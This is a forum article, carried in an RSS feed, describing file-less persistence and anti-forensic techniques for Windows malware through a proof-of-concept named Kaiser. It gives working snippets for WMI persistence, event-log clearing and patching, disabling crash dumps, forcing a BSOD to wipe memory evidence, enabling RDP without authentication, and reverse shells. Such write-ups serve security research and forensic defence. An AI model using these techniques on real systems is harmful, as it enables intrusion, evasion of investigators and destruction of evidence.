<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Anti-forensic and File-less Malware</title>
    <link>https://0x00sec.org/t/anti-forensic-and-file-less-malware/10008</link>
    <description># Anti-forensic and File-less Malware

### Recommended Pre-requisites

* C programming language
* PowerShell scripting language
* Intel x86 assembly language
* Windows API
* Windows Internals
* PE file format

## Contents

1. [Introduction](#1-introduction)
2. [Fundamental Concepts](#2-fundamental-concepts)
    * 2.1 [File-less Techniques](#21-file-less-techniques)
        * 2.1.1 [Persistence](#211-persistence)
        * 2.1.2 [Process Hollowing](#212-process-hollowing)
        * 2.1.3 [Reflective DLL Injection](#213-reflective-dll-injection)
        * 2.1.4 [Backdoor](#214-backdoor)
    * 2.2 [Anti-forensic Techniques](#22-anti-forensic-techniques)
        * 2.2.1 [Disabling Event Logging](#221-disabling-event-logging)
            * 2.2.1.1 [Suspending Event Logging Threads](#2211-suspending-event-logging-threads)
            * 2.2.1.2 [Patching the Event Logging Module](#2212-patching-the-event-logging-module)
        * 2.2.2 [Forensic Analysis Prevention](#222-forensic-analysis-prevention)
            * 2.2.2.1 [Uninstalling Persistence](#2221-uninstalling-persistence)
            * 2.2.2.2 [Wiping Event Logs](#2222-wiping-event-logs)
            * 2.2.2.3 [Removing Memory Artefacts](#2223-removing-memory-artefacts)
3. [Kaiser](#3-kaiser)
    * 3.1 [Persistence Mechanism](#31-persistence-mechanism)
    * 3.2 [Process-hollowed and Networked Interactive Sessions](#32-process-hollowed-and-networked-interactive-sessions)
    * 3.3 [Active Forensic Analysis Prevention](#33-active-forensic-analysis-prevention)
    * 3.4 [Further Improvements](#34-further-improvements)
4. [Conclusion](#4-conclusion)
5. [References](#5-references)

## 1 Introduction

One of the most advantageous attributes for a malware to have is survival as a means to maintain persistence and to evade detection by security solutions. Since developing a full-blown piece of malware requires expensive resources, this trait becomes increasingly desireable to continuously remain unknown and undetected. 

A property of such malware should include anti-forensic capabilities in its kit such that its footprint is minimal as well as tampering with with system and forensic evidence to prevent its capture and analysis. Coupled with file-less techniques, sophisticated malware may have the ability to attack a system while being evasive by avoiding traditional methods where detection has been developed and matured over the past years.

The proof-of-concept malware, Kaiser, was developed to demonstrate an example subset of anti-forensic and file-less functionalities. Such functionalities include file-less persistence and execution of binaries, and anti-forensic countermeasures that disable the event logging service and active prevention of forensic analysis of the infected machine and itself to deny any further investigation into the intrusion.

----

# 2 Fundamental Concepts

This section discusses the necessary background information for the example subset of anti-forensic and file-less capabilities implemented into Kaiser.

## 2.1 File-less Techniques

Currently, there is no official and universal definition of the term &quot;file-less&quot; so the one given by Microsoft&#39;s &quot;Fileless threats&quot;&lt;sup&gt;[1](https://docs.microsoft.com/en-us/windows/security/threat-protection/intelligence/fileless-threats)&lt;/sup&gt; will be used for the scope of this paper. Microsoft defines three types of &quot;file-less&quot;:

1. Type I: No file activity is performed - this describes threats that never touches the disk. Such examples can leverage the use of an exploit to attack a system by injecting directly into memory. This type of threat is classified as highly sophisticated, uncommon, impractical, and unreliable despite it being incredibly dangerous.

2. Type II: Indirect file activity - this describes threats that do not traditionally write to the file system. An example of this may leverage the Windows Management Instrumentation (WMI) to install a persistence mechanism that executes a command to perform a malicious activity. Microsoft state that the WMI repository exists as a physical file and as such, the installed threat indirectly uses disk. Since it is a &quot;multi-purpose data container,&quot; detection and removal of embedded malicious data is non-trivial.

3. Type III: Files required to operate - this describes threats that utilise files for &quot;execution and injection&quot; operations such as using &quot;executables, DLLs, LNK files or scheduled tasks&quot; as well as malicious macro documents.

&lt;INSERT FILE-LESS IMAGE HERE&gt;

The following functionality delves into types II and III to deliver persistence and execution of applications file-lessly.

### 2.1.1 Persistence

The WMI is &quot;the infrastructure for management data and operations on Windows-based systems.&quot;&lt;sup&gt;[2](https://docs.microsoft.com/en-us/windows/desktop/wmisdk/wmi-start-page)&lt;/sup&gt; It provides methods for storing and querying data as well as providing methods to execute operations, each categorised under their own appropriate classes where each class lives under their respective namespace. For example, the _Win32\_Process_&lt;sup&gt;[3](https://docs.microsoft.com/en-us/windows/desktop/cimwin32prov/win32-process)&lt;/sup&gt; class contains data on existing processes such as the command line, executable path, name, and process ID that can be queried. It also provides the _Create_&lt;sup&gt;[4](https://docs.microsoft.com/en-us/windows/desktop/cimwin32prov/create-method-in-class-win32-process)&lt;/sup&gt; method to spawn new processes.

In addition to storing data, the WMI includes a notification system that can be triggered on specific events of which there are two types: intrinsic and extrinsic.&lt;sup&gt;[5](https://docs.microsoft.com/en-us/windows/desktop/wmisdk/determining-the-type-of-event-to-receive)&lt;/sup&gt; Intrinsic events occur when there is a change internal to the WMI, that is, any modifications to classes, objects or namespaces. In contrast, extrinsic events happen when there is a change external to the WMI such as on process, module or thread start, or registry changes.

An event filter is described as the conditions under which the WMI fires an event.&lt;sup&gt;[6](https://docs.microsoft.com/en-us/windows/desktop/wmisdk/creating-an-event-filter)&lt;/sup&gt; They can be generated by specifying a filter query which indicates on which event it should be triggered. In the case of restart persistence, it may be desired to set an event filter to be fired when the user logs onto the system, that is, in the event of the instance creation of a _Win32_LoggedOnUser_&lt;sup&gt;[7](https://docs.microsoft.com/en-us/windows/desktop/cimwin32prov/win32-loggedonuser)&lt;/sup&gt; class. The following PowerShell code demonstrates this example:

```powershell
$query = &quot;SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA &#39;Win32_LoggedOnUser&#39;&quot;
$evtFilter = Set-WmiInstance -Class __EventFilter -Namespace &quot;root\subscription&quot; -Arguments @{
    Name = &quot;FilterName&quot;;
    EventNamespace = &quot;root\cimv2&quot;;
    QueryLanguage = &quot;WQL&quot;;
    Query = $query;
}
```

The event filter can be used to deliver a consumer which can take action upon the event trigger. To perform an action, an _\_\_EventConsumer_&lt;sup&gt;[8](https://docs.microsoft.com/en-us/windows/desktop/wmisdk/--eventconsumer)&lt;/sup&gt; can be created. The _CommandLineEventConsumer_&lt;sup&gt;[9](https://docs.microsoft.com/en-us/windows/desktop/wmisdk/commandlineeventconsumer)&lt;/sup&gt; class is a specific _\_\_EventConsumer_ which can execute an arbitrary command on the command line by defining its _CommandLineTemplate_ argument. The following PowerShell code demonstrates this example:

```powershell
$cmd = powershell.exe C:\Path\To\Script.ps1
$evtConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace &quot;root\subscription&quot; -Arguments @{
    Name = &quot;ConsumerName&quot;;
    CommandLineTemplate = $cmd
}
```

Finally, to combine the event filter with its consumer, the _\_\_FilterToConsumerBinding_&lt;sup&gt;[10](https://docs.microsoft.com/en-us/windows/desktop/wmisdk/--filtertoconsumerbinding)&lt;/sup&gt; class can be used. The folllowing PowerShell code deomstrates this example:

```powershell
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace &quot;root\subscription&quot; -Arguments @{
    Filter = $evtFilter;
    Consumer = $evtConsumer
}
```

Upon the creation and registration of these three classes instances, whenever a user logs into a system, it will trigger the event filter and the consumer will activate the execution of the PowerShell script. To transform this into type II file-less, the defined PowerShell script can be made redundant by translating its contents into the command line.

### 2.1.2 Process Hollowing

Third-party applications can be file-lessly executed directly from memory. The _process hollowing_ technique describes an example of how this can be done by manually emulating the user-mode procedure carried out by the Windows image loader when a PE file is called to execute. The following steps describe an example of how this can be performed:

1. Read the raw bytes of the desired PE file
2. Verify the PE file format
3. Create a suspended process
4. Unmap the suspended process&#39;s executable image
5. Map the bytes of the PE file into the process
6. Set the entry point to the PE file&#39;s entry point
7. Resume the process

Mapping the PE file is relatively straight-forward for process hollowing as it will automatically initialise all the necessary objects in memory such as DLLs and the executable image&#39;s import values.

```
Mapping PE file

                                 Disk                            Memory
                           
                                             ,+------------ +---------------+ ---  ImageBase
                                            /               |    Headers    |    SizeOfHeaders
                                          /   ,+----------- +---------------+ ---  VirtualAddress
                        --- +------------+   /              |               |
            SizeofHeaders   |   Headers  | /                |     .text     |    VirtualSize
      PointerToRawData  --- +------------+                  |               |
            SizeOfRawData   |   .text    | ,+-------------- +---------------+ ---  VirtualAddress
      PointerToRawData  --- +------------+                  |               |
            SizeOfRawData   |   .data    |                  |     .data     |    VirtualSize
      PointerToRawData  --- +------------+                  |               |
            SizeOfRawData   |    ...     | `+-------------- +---------------+ ---  VirtualAddress
                        --- +------------+                  |               |
                                          \                 |      ...      |    VirtualSize
                                            \               |               |
                                             `+------------ +---------------+ ---
```

As shown in the above figure, the PE file on disk must be expanded to fill each of its sections in memory described by their size members. The header of the PE file remains the same size and starts at the `ImageBase` but each section must be translated to its correct virtual offset and pad up to its `VirtualSize` rather than its `SizeOfRawData`.

The desired PE file&#39;s bytes can be stored in memory which will be used to replace it in memory making it file-less. Since this uses a file from disk, it is considered a type III file-less technique.

### 2.1.3 Reflective DLL Injection

_Reflective DLL Injection_ uses a similar method to _process hollowing_ but it requires further preparations as is not automatically initialised as before. After mapping the PE file (that follows the same procedure as process hollowing), the relocations and imports must be manually updated to contain the correct values. 

#### Fixing Relocations

In the case where the DLL is not loaded into its desired base address, the relocations need to be parsed such that the references in the code to other sections are accurate. This is due to the assumption that the linker makes about the image base when mapped into memory.&lt;sup&gt;[11](https://msdn.microsoft.com/en-au/library/ms809762.aspx)&lt;/sup&gt; The relocation table, if present, can be found in the `.reloc` section which contains an array of `IMAGE_BASE_RELOCATION` structures, each followed by `WORD TypeOffset` values that contain both the type of relocation and the offset. The structure is defined&lt;sup&gt;[12](https://doxygen.reactos.org/d5/d44/ntimage_8h_source.html#l00162)&lt;/sup&gt; like so:

```c
typedef struct _IMAGE_BASE_RELOCATION {
    DWORD   VirtualAddress;
    DWORD   SizeOfBlock;
} IMAGE_BASE_RELOCATION, *PIMAGE_BASE_RELOCATION;
```

The `VirtualAddress` is the starting RVA for the following block of relocations and the `SizeOfBlock` is the size of the entire block including both the `IMAGE_BASE_RELOCATION` structure and the `TypeOffset` relocations. For each `TypeOffset` value, the top 4 bits detail the type of relocation and the bottom 12 bits is the offset from the `VirtualAddress` RVA. An example:

```
VirtualAddress: 0x00001000; SizeOfBlock: 0x0000000C
TypeOffset: 0x300C
TypeOffset: 0x3010
```

Both `TypeOffset`s are a `IMAGE_REL_BASED_HIGHLOW` relocation type as indicated by the value of `3`. The first offset is at `0xC` and the second is at `0x10`. Assume that the DLL was loaded into `0x01000000` and its `ImageBase` is `0x00400000`. The relocation would be calculated and corrected as follows&lt;sup&gt;[13](https://doxygen.reactos.org/df/da2/sdk_2lib_2rtl_2image_8c.html#a61fae0253935550115acc7751e6d6073) [14](https://doxygen.reactos.org/df/da2/sdk_2lib_2rtl_2image_8c.html#a79a460be03d9da50f71d427b26238496)&lt;/sup&gt;:

```c
// Linker-assumed desired base address, obtained from IMAGE_OPTIONAL_HEADER.ImageBase.
DWORD ImageBase = 0x00400000;
// Starting RVA of relocation block, obtained from IMAGE_RELOCATION_BLOCK.VirtualAddress.
ULONG VirtualAddress = 0x00001000;
// Base address where DLL was actually loaded.
PVOID BaseAddress = 0x01000000;
// Starting address of relocation block.
ULONG_PTR Address = (ULONG_PTR)BaseAddress + (ULONG_PTR)VirtualAddress;
// Difference between the base address and ImageBase.
LONGLONG Delta = (ULONG_PTR)BaseAddress - ImageBase; // = 0x00C00000

PULONG LongPtr = NULL;
SHORT Offset = 0;

// Calculate the first relocation.
USHORT TypeOffset1 = 0x300C;
// Get the offset from VirtualAddress.
Offset = TypeOffset1 &amp; 0xFFF;
LongPtr = (PULONG)(Address + Offset);
// Correct the value of the first relocation.
*LongPtr += Delta;

// Calculate the second relocation.
USHORT TypeOffset2 = 0x3010;
// Get the offset from VirtualAddress.
Offset = TypeOffset2 &amp; 0xFFF;
LongPtr = (PULONG)(Address + Offset);
// Correct the value of the second relocation.
*LongPtr += Delta;
```

Note: The `IMAGE_REL_BASED_HIGHLOW` relocation type alone is sufficient for the scope of this paper.

#### Fixing Import Table

The import table consists of functions that rely on external shared libraries to provide extended functionality to the application on runtime, especially for Windows API routines that are exported by common DLLs `ntdll.dll` and `kernel32.dll`. When an executable is loaded into memory, the table must be initialised with the correct addresses of where the exported functions exist in memory so that it can be referenced and used.

Walking the import table first requires the identification of the `IMAGE_IMPORT_DESCRIPTOR` struct which is defined&lt;sup&gt;[15](https://doxygen.reactos.org/d5/d44/ntimage_8h_source.html#l00572)&lt;/sup&gt; as:

```c
typedef struct _IMAGE_IMPORT_DESCRIPTOR {
    union {
        ULONG Characteristics;
        ULONG OriginalFirstThunk;
    } DUMMYUNIONNAME;
    ULONG TimeDateStamp;
    ULONG ForwarderChain;
    ULONG Name;
    ULONG FirstThunk;
} IMAGE_IMPORT_DESCRIPTOR, *PIMAGE_IMPORT_DESCRIPTOR;
```

The important members of this structure are `OriginalFirstThunk`, `Name` and `FirstThunk`. The `Name` member points to the ASCIIZ string of the DLL that provides the exported routines for this set of imports. Both `OriginalFirstThunk` and `FirstThunk` point to an `IMAGE_THUNK_DATA` struct which are both identical on disk as a raw executable file. It is defined&lt;sup&gt;[16](https://doxygen.reactos.org/d5/d44/ntimage_8h_source.html#l00510)&lt;/sup&gt; as:

```c
typedef struct _IMAGE_THUNK_DATA32 {
    union {
        ULONG ForwarderString;
        ULONG Function;
        ULONG Ordinal;
        ULONG AddressOfData;
    } u1;
} IMAGE_THUNK_DATA32, *PIMAGE_THUNK_DATA32;
```

This structure can either be interpreted as either of the four union members and the `IMAGE_IMPORT_BY_NAME` struct which is defined&lt;sup&gt;[17](https://doxygen.reactos.org/dd/d43/pedump_8c_source.html#l00328)&lt;/sup&gt; as:

```c
typedef struct _IMAGE_IMPORT_BY_NAME {
    WORD Hint;
    BYTE Name[1];
} IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;
```

When the executable is mapped into memory and the import table is being initialised, it will traverse the `FirstThunk` array of `IMAGE_THUNK_DATA` structures and replace them with the address of its function in memory. To locate the function, the `IMAGE_THUNK_DATA.Ordinal` will be checked with a bitwise-and operation against the most significant bit, that is, `IMAGE_THUNK_DATA.Ordinal &amp; 0x80000000`. If it is set, the ordinal will be the lower 16-bits of the value and the function can be located using it as the offset in the DLL&#39;s ordinal table. For example, if the `Ordinal` value is `0x8000013D`, the ordinal value will be `0x13D`. Otherwise, the function is found by name by following into the `IMAGE_IMPORT_BY_NAME` struct and using its `Name` member.  The `Hint` can be used as an offset into the DLL&#39;s exported name table to find the address of the exported function but also requires a check to test if the function name matches however it is optional and some linkers do not set this value. Once the address of the function has been found, it will replace the `FirstThunk`&#39;s `IMAGE_THUNK_DATA`&#39;s structure with the address while leaving the `OriginalFirstThunk`&#39;s intact.&lt;sup&gt;[18](http://win32assembly.programminghorizon.com/pe-tut6.html)&lt;/sup&gt;

### 2.1.4 Backdoor

Achieving a type III file-less backdoor is possible by using a technique known as _Living off the Land_ (LOL) that describes the usage of an existing executable on the system to perform an action. This removes the need for malware to import their own or drop additional tools onto the machine making it inherently file-less but can also serve as a contingency. Windows natively comes packaged with _Remote Desktop Protocol_ (RDP) that enables access to the system from a remote machine over the network however, it may be disabled. A few settings may need to be reconfigured to enable it:

* Registry value `fDenyTSConnections` under the key `HKLM\System\CurrentControlSet\Control\Terminal Server` should be set to `0` to allow connections
* Registry value `UserAuthentication` under the key `HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp` should be set to `0` to disable &quot;Network Level Authentication&quot;
* Windows Firewall should allow inbound TCP connections on port 3389

----

## 2.2 Anti-forensic Techniques

Forensics Wiki defines _anti-forensics_ as &quot;Attempts to negatively affect the existence, amount and/or quality of evidence from a crime scene, or make the analysis and examination of evidence difficult or impossible to conduct&quot;&lt;sup&gt;[19](https://www.forensicswiki.org/wiki/Anti-forensic_techniques)&lt;/sup&gt; whereas MITRE ATT&amp;CK&lt;sup&gt;TM&lt;/sup&gt; uses the term _Defense Evasion_ that is described as &quot;techniques an adversary may use to evade detection or avoid other defenses.&quot;&lt;sup&gt;[20](https://attack.mitre.org/tactics/TA0005/)&lt;/sup&gt; The anti-forensic methods that will be discussed covers only a subset of anti-forensic methods that try to remove or hide evidence of the malware&#39;s operations, and therefore detection, alongside the ability to disrupt the capabilities of a forensic investigation and analysis. These include tampering with the event logging service and active meaures to prevent the proper analysis of both the system and malware.

### 2.2.1 Disabling Event Logging

Microsoft defines event logging as &quot;... a standard, centralized way for applications (and the operating system) to record important software and hardware events. The event logging service records events from various sources and stores them in a single collection called an event log.&quot;&lt;sup&gt;[21](https://docs.microsoft.com/en-us/windows/desktop/eventlog/event-logging)&lt;/sup&gt; Event logs may contain a wealth of information including, but not limited to, user logins, external device connections, process creation, remote desktop connections, file activity, and even remote thread creations. The event logging service is, like other Windows services, run as threads under an _svchost_ process container. From a forensic standpoint, it is a valuable source from which certain activity can be detected or discovered via monitoring or recovered from a machine of interest. To deny event logging is to avoid inital detection from administration and, if necessary, the destruction of crucial evidence and proper analysis of the infected system. It is important to know that despite its effectiveness, it is suspicious when there are long delays in between log entries and even more so when the logs are empty. This is left for the operator to understand how this works and when it is appropriate and necessary to disable event logging.

Clearing event logs is trivial by using the Windows Event Log API&#39;s `EvtClearLog`&lt;sup&gt;[22](https://docs.microsoft.com/en-us/windows/desktop/api/winevt/nf-winevt-evtclearlog)&lt;/sup&gt; and specifying the `ChannelPath` to be deleted. For example, the following call clears the _Windows Logs_&#39; _Security_ event log:

```c
EvtClearLog(NULL, L&quot;Security&quot;, NULL, 0);
```

It can also be used to clear _Applications and Services Logs_&#39; Operational logs. The following clears the _Terminal Services_&#39;s _Local Session Manager_ that stores logs corresponding to Remote Desktop Protocol:

```c
EvtClearLog(NULL, L&quot;Microsoft-Windows-TerminalServices-LocalSessionManager/Operational&quot;, NULL, 0);
```

It should be noted that if the _Security_ event log is cleared, a special event (ID 1102) will remain stating &quot;The audit log was cleared.&quot; Additionally, if the system was configured to forward logs to a remote server, clearing the event logs will be ineffective. There are two methods to defeat these mechanisms: suspending the event logging service&#39;s threads and patching the event logging service&#39;s module.

#### 2.2.1.1 Suspending Event Logging Threads

Halil Dalabasmaz&#39;s post _Phant0m: Killing Windows Event Log_&lt;sup&gt;[23](https://artofpwn.com/phant0m-killing-windows-event-log.html)&lt;/sup&gt; informs of two ways to locate the event logging service&#39;s threads: analysing the `SubProcessTag`s in the corresponding _svchost.exe_ process&#39;s _Thread Environment Block_ s (TEB) or walking thread stacks using debugging symbols. This paper only focusses on the former.

The goal of discovering the `SubProcessTag` is because it can be used to identify the service tag for a thread, in this case, it is used to identify the event logging service&#39;s threads.&lt;sup&gt;[24](https://wj32.org/wp/2010/03/30/howto-use-i_querytaginformation/)&lt;/sup&gt; The `SubProcessTag` is found in the TEBs of the event logging service&#39;s process which can be found by performing the following steps:

1. Identify the event logging service process using `OpenService`
2. Open the process using `OpenProcess`
3. Iterate through the process&#39;s threads
4. For each thread, obtain the TEB address using `NtQueryInformationThread`
5. Get the `SubProcessTag` value in the TEB struct using `ReadProcessMemory`

To check the thread&#39;s service tag, the `I_QueryTagInformation` function is called with the `ServiceNameFromTagInformation` `SC_SERVICE_TAG_QUERY_TYPE` value which stores the tag information into a `SC_SERVICE_TAG_QUERY` struct type defined as:

```c
typedef struct _SC_SERVICE_TAG_QUERY {
    ULONG ProcessId;
    ULONG ServiceTag;
    ULONG Unknown;
    PVOID Buffer;
} SC_SERVICE_TAG_QUERY, *PSC_SERVICE_TAG_QUERY;
```

The struct should be initialised as follows before calling `I_QueryTagInformation`:

```c
SC_SERVICE_TAG_QUERY sstq;
sstq.ProcessId = (ULONG)dwProcessId;
sstq.ServiceTag = (ULONG)uServiceTag;
sstq.Unknown = 0;
sstq.Buffer = NULL;
```

where `dwProcessId` is the process ID of the service that contains the thread and the `uServiceTag` is the `SubProcessTag` value. On success, the `Buffer` member will contain the string of the service tag, that is, if querying for event logging threads, it will contain `&quot;eventlog&quot;`. After all of the the event logging threads have been identified, they can be opened using `OpenThread` with `THREAD_SUSPEND_RESUME` access rights and subsequently suspended or resumed.

#### 2.2.1.2 Patching the Event Logging Module

The event logging service can be patched to prevent writing to the event logs by targetting the _wevtsvc.dll_ module that exists within the corresponding _svchost.exe_ process. The Mimikatz source code&lt;sup&gt;[25](https://github.com/gentilkiwi/mimikatz/blob/110a831ebe7b529c5dd3010f9e7fced0d3e3a46c/mimikatz/modules/kuhl_m_event.c)&lt;/sup&gt; details an inline-patching technique on the `Channel::ActualProcessEvent` function in _wevtsvc.dll_. The following disassembly was obtained from IDA Pro:

```asm
; void __thiscall Channel::ActualProcessEvent(Channel *this, struct BinXmlReader *)

            6A 10   push    10
   B8 B8 F9 69 71   mov eax,    offset loc_7169F9B8
   E8 57 EF FF FF   call    __EH_prolog3_0
            8B F1   mov esi,    ecx
         8B 4D 08   mov ecx,    [ebp + arg_0]       ; this
   E8 1C F8 FF FF   call    BinXmlReader::Reset     ; BinXmlReader::Reset(void)
            33 C9   xor ecx,    ecx
38 8E C0 00 00 00   cmp [esi + 0C0h],   cl
            74 0C   jz  short loc_715D286D
```

The first instance of the byte pattern `8B F1 8B 4D 08 E8` is located within the module and then, from an offset of `-12` (decimal), the bytes are replaced with `C2 04 00` which disassembles into:

```asm
; void __thiscall Channel::ActualProcessEvent(Channel *this, struct BinXmlReader *)

         C2 04 00   ret 4
```

This simply forces the function to return immediately rendering the remaining original code unused.

### 2.2.2 Forensic Analysis Prevention

In the circumstance where there is an attempt to perform analysis on the infected machine, such as acquiring a forensic image of memory, of when the operator decides that the malware is no longer needed on the system, evidence of malicious and suspicious presence and activity should be erased. The following discusses some ways that this can be achieved including: uninstalling persistence mechanisms, removing potential sources of evidence, and destruction of any memory-resident artefacts.

#### 2.2.2.1 Uninstalling Persistence

Uninstalling the persistence mechanism from the WMI will prevent execution of the malware in the future. If all malicious payloads are bootstrapped using this persistence, the uninstallation will effectively remove all traces of code thus preventing recovery and therefore, analysis.

Deleting the persistence mechanism in the WMI can be done in C via the `IWbemServices`&lt;sup&gt;[26](https://docs.microsoft.com/en-us/windows/desktop/api/wbemcli/nn-wbemcli-iwbemservices)&lt;/sup&gt; interface. After initialisation and connection to the WMI server&#39;s `root\subscription` namespace, the `IWbemServices` can be used to delete instances for given a path. For example, deleting a `CommandLineEventConsumer` can be done by:

```c
// Initialise IWbemServices pointer.
IWbemServices *pSvc = NULL;

// Set path to the WMI instance which shall be deleted.
LPWSTR szPath = L&quot;CommandLineEventConsumer.Name=&#39;ExampleConsumer&#39;&quot;

// Delete.
BSTR bPath = SysAllocString(szPath);
HRESULT hRes = pSvc-&gt;lpVtbl-&gt;DeleteInstance(pSvc, bPath, 0, NULL, NULL);
SysFreeString(bPath);
```

#### 2.2.2.2 Wiping Event Logs

As a precautionary measure, if the system does not forward any logs to a remote server and there is an attempt at anlysis of an infected machine, erasing the event logs removes a major source of information which may be used in a forensic investigation. Clearing the event logs can be done using the `EvtClearLog` as aforementioned.

#### 2.2.2.3 Removing Memory Artefacts

During the circumstance where analysis is being performed on the infected machine, destroying artefacts that are resident in memory is crucial because the malicious code may be caught in a memory image capture. One solution that can destroy the data in memory before an image capture can be performed is by causing the system to shut down or reset. This can be forced by producing a Blue Screen of Death (BSOD). Note that while data in volatile memory will be erased, Windows may generate crash dumps to preserve the state of memory in the event of a BSOD. Disabling crash dumps can be done by modifying the following settings:

* Registry value `RPSessionInterval` under the key `HKLM\Software\Microsoft\Windows NT\CurrentVersion\SystemRestore` should be set to `0`
* Registry subkey `Clients` under `HKLM\Software\Microsoft\Windows NT\CurrentVersion\SPP` should be deleted
* Registry subkey `Leases` under `HKLM\Software\Microsoft\Windows NT\CurrentVersion\SPP` should be deleted
* Registry value `CrashDumpEnabled` under the key `HKLM\System\CurrentControlSet\Control\CrashControl` should be set to `0`

After disabling crash dumps, a BSOD can be created in userland from two methods: calling `NtRaiseHardError`&lt;sup&gt;[27](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FError%2FNtRaiseHardError.html)&lt;/sup&gt; or by setting a process as critical and then terminating it. To BSOD with `NtRaiseHardError`, the `OptionShutdownSystem` parameter must be passed into the `HARDERROR_RESPONSE_OPTION` parameter and the process must have the `SeShutdownPrivilege` privilege:

```c
// Get shutdown privileges.
if (ProcessSetPrivilege(GetCurrentProcess(), SE_SHUTDOWN_NAME, TRUE) == TRUE) {
    HARDERROR_RESPONSE hr;
    // Trigger BSOD.
    NtRaiseHardError(STATUS_ACCESS_DENIED, 0, NULL, NULL, OptionShutdownSystem, &amp;hr);
}
```

Creating and terminating a critical process is relatively simple:

```c
// Set process critical.
RtlSetProcessIsCritical(TRUE, NULL, FALSE);
// Trigger BSOD by terminating critical process.
ExitProcess(0);
```

----

# 3 Kaiser

Kaiser is a proof-of-concept malware that was developed to demonstrate the discussed anti-forensic and file-less techniques on the Windows 7 32-bit operating system. They are implemented into several functions that enable or utilise them:

* `mimikatz`: reflectively loads the Mimikatz third-party application into the pre-defined system binary&#39;s process via _process hollowing_ and connects back to a user-specified remote address and port for an interactive session over the network. The Mimikatz binary is compressed and embedded into Kaiser.
* `shell`: reflectively loads the Windows command shell application (_cmd.exe_) into the pre-defined system binary&#39;s process via _process hollowing_ and connects back to a user-specified remote address and port for an interactive session over the network.
* `evtlog`: enables or disables the event logging service, or clears the event logs of choice. Event logging threads can be suspended or resumed, or the event logging service&#39;s module can be patched or unpatched.
* `rdp`: enables or disables the Remote Desktop Protocol.
* `dex`: Download and EXecute; downloads and reflectively loads an application into the pre-defined system binary&#39;s process via _process hollowing_ and optionally connects back to a user-specified remote address and port for an interactive session (console applications only) over the network.
* `purge`: clears pre-defined event logs, uninstalls WMI persistence mechanism, and/or forces a BSOD. A separate thread is spawned to monitor analysis tools which, when triggered, will activate all of the previous operations.

## 3.1 Persistence Mechanism

Kaiser&#39;s initial infection vector is via a PowerShell script that installs a downloader script into the WMI for persistence. The downloaded script is an instance of _Invoke-ReflectivePEInjection.ps1_&lt;sup&gt;[28](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1#L662)&lt;/sup&gt; that, in turn, downloads the _Kaiser.dll_ binary into memory with which it is reflectively injected into the _services.exe_ (by default) process.

1. Install a `CommandLineEventConsumer` downloader into the WMI that activates every user logon
2. The downloader script downloads another script that contains _Invoke-ReflectivePeInjection.ps1_ into memory
3. The second script downloads _Kaiser.dll_ into memory and then calls _Invoke-ReflectivePEInjection.ps1_ to inject into _services.exe_

Since the WMI consumers run under NT AUTHORITY\SYSTEM, injection into _services.exe_ is possible. Every stage is performed file-lessly and will be true for persistence.

Because there are multiple stages to start Kaiser, it introduces some dependencies such as internet access and that each stage is performed without errors. The advantage of this is that the payload can be updated relatively easily (provided that the download address is the same) and access to the payload can be invalidated by removing the resource.

## 3.2 Process-hollowed and Networked Interactive Sessions

Interactive sessions over the network back to the operator are only available with console applications such as Mimikatz or _cmd.exe_ because they utilise the standard input and output handles. The creation of a process with _process hollowing_ using `CreateProcess` allows the standard handles to be set to a socket (initialised using `WSASocket`) via the `STATUPINFO`&lt;sup&gt;[29](https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/ns-processthreadsapi-_startupinfoa)&lt;/sup&gt;structure:

```c
typedef struct _STARTUPINFOA {
  DWORD  cb;
  LPSTR  lpReserved;
  LPSTR  lpDesktop;
  LPSTR  lpTitle;
  DWORD  dwX;
  DWORD  dwY;
  DWORD  dwXSize;
  DWORD  dwYSize;
  DWORD  dwXCountChars;
  DWORD  dwYCountChars;
  DWORD  dwFillAttribute;
  DWORD  dwFlags;
  WORD   wShowWindow;
  WORD   cbReserved2;
  LPBYTE lpReserved2;
  HANDLE hStdInput;
  HANDLE hStdOutput;
  HANDLE hStdError;
} STARTUPINFOA, *LPSTARTUPINFOA;
```

To use the standard handles, the `dwFlags` member must have the `STARTF_USESTDHANDLES` value. To direct them over the network, simply set the handles to the value of the socket like so:

```c
// Initialise the socket using WSASocket.
SOCKET socket = CreateSocket(...);
// Initialise STARTUPINFO structure.
STARTUPINFO si;

// Use the std handles and set it to the socket.
si.dwFlags |= STARTF_USESTDHANDLES;
si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)socket;

// Start process hollowing.
CreateProcess(..., &amp;si, ...);
```

## 3.3 Active Forensic Analysis Prevention

The `purge` module offers a process-monitoring functionality designed to target any analysis tools that may be used against Kaiser. The current example implementation actively searches for new processes that contain the case-insensitive string &quot;ftk&quot; in its process name to prevent the FTK memory acquisition tools. If the condition is satisfied, it will immediately clear some pre-defined event logs, uninstall the persistence in the WMI and then crash the system with a BSOD in an attempt to protect Kaiser from any form of analysis and prevent any further possible forensic investigation. 

Since the persistence was engineered file-lessly and with multiple stages, even if the `CommandLineEventConsumer` script was obtained, it will only point to the resource from where it downloaded Kaiser Theoretically, this can be easily counter by removing it if the operator was alerted and reacted within time thus, prolonging the lifetime of the malicious code without needing to be redeveloped against signatures.

## 3.4 Further Improvements

Improvements can be developed in order to make Kaiser more effective with regards to anti-forensics, including:

* Automation of event logging disabling and enabling while performing a malicious task to remove accidental errors from the operator. This is non-trivial because of the non-synchronous nature of how Kaiser operates certain functionality, and event log disabling may occur over a long period of time during shell or Mimikatz usage which may be considered unnecessary.
* Automatic uninstall after inactivity from the operator. If, for any particular reason, the operator no longer accesses an instance of Kaiser on an infected machine, it should perform an automatic uninstallation to prevent any unnecessary detection.
* Hooking the event logging service to drop events related to Kaiser activity. This could potentially solve the non-trivial solution of automating disabling and enabling while allowing benign entries to be logged seamlessly.
* Additional analysis tools to monitor. Currently the only tool(s) that is targeted is FTK. Adding more to the list such as dd and Sysinternals tools would make forensic analysis prevention more effective.

----

# 4 Conclusion

